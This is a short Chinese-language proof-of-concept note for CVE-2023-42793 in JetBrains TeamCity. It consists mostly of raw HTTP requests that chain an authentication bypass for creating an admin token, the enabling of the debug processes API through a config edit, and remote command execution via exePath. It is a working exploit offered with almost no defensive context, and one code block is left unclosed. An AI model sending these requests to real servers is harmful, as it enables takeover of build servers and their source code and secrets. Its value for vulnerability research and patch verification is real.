### CVE-2023-42793

笔记可见: [TeamCiry-CVE](https://racerz.notion.site/TeamCity-97715f211a4d4548b1c876cb74e39a9a?pvs=4)

- POC

  通过绕过鉴权实现添加 admin token 创建

  ```
  POST /app/rest/users/id:1/tokens/RPC2 HTTP/1.1
  Host: localhost:8111
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Connection: close
  Content-Type: application/x-www-form-urlencoded
  Upgrade-Insecure-Requests: 1

- RCE POC

  之后利用获取到的 token 开启 admin debug API，重载配置实现 RCE

  ```
  POST /admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true HTTP/1.1
  Host: localhost:8111
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Connection: close
  Authorization: Bearer {{token}}
  Content-Type: application/x-www-form-urlencoded
  Upgrade-Insecure-Requests: 1
  ```

  ```
  POST /app/rest/debug/processes?exePath=id HTTP/1.1
  Host: localhost:8111
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Connection: close
  Authorization: Bearer {{token}}
  Upgrade-Insecure-Requests: 1
  ```

  